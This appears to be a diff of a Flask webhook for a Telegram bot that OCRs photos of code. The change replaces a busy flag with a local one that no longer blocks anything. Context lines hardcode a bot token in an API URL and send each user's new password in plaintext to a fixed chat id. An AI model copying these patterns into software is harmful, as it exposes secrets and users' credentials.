@@ -239,7 +239,6 @@ def cms(wel):
 
 #Selenium
 def get_ocr(url):
-    global stop_selenium
     stop_seleium=False
     #download file
     filename = url.split("/")[-1]
@@ -294,14 +293,11 @@ def get_ocr(url):
             found1 = False
     #delete file
     os.remove(filename)
-    stop_seleium=True
-#-selenium
+#-Selenium
 
 #Flask
-stop_selenium=True
 @app.route('/', methods=['POST', 'GET'])
 def index():
-    global stop_selenium
     if request.method == 'POST':
         r = request.get_json()
         chat_id = r['message']['chat']['id']
@@ -330,8 +326,10 @@ def index():
             user=chat_id
         m = re.compile(r'[a-zA-Z0-9]*$')
         if check_key(user)=='yes' and check_pass(user)=='yes':
-            if photo_id != "0" and stop_seleium:
+            proces_ocr = True
+            if photo_id != "0" and proces_ocr:
                 send_message(chat_id, text="Подождите, пока фото обрабатывается.")
+                proces_ocr = False
                 photo="https://api.telegram.org/bot953353291:AAEgHkSY2PLKa2Ve2Z7Mu3WAOM5pir_fUmk/getFile?file_id="+str(photo_id)
                 ph = requests.get(photo)
                 ph= ph.json()
@@ -340,7 +338,8 @@ def index():
                 text_ocr = get_ocr(path_to_download)
                 send_message(chat_id, text="Вот что у нас получилось:")
                 send_message(chat_id, text=text_ocr)
-                send_message(chat_id, text="1) Проверьте правильность распознования \n2) Скопируйте код \n3) Отправьте его нам для исполнения\n**Если вы что-то упустите, мы подскажем, где ошибка)")
+                send_message(chat_id, text="1) Проверьте правильность распознования \n2) Скопируйте код \n3) Отправьте его нам для исполнения\n**Если вы что-то упустите, мы подскажем, где ошибка!")
+                proces_ocr = True
             elif message != "":
                 result = cms(message)
                 send_message(chat_id, text=result)
@@ -353,6 +352,7 @@ def index():
         elif message != '' and len(message)>6 and str(message).isalpha()!=1 and str(message).isdigit()!=1 and check_key(user)=='yes' and check_pass(user)=='no' and m.match(str(message)):
             add_pass(user,message)
             send_message(chat_id, text="Пароль зарегистрирован!")
+            send_message(chat_id, text="Можно приступать к работе с ботом!")
             uspa=str(user+' | password:'+message)
             send_message(676318616, text=uspa)
         elif message != '' and check_key(user)=='no':
@@ -362,7 +362,7 @@ def index():
         return jsonify(r)
     return '<h1>PM19.1 bot working now!</h1>'
 #-Flask
-stop_selenium=True
+
 
 if __name__ == '__main__':
     app.run()
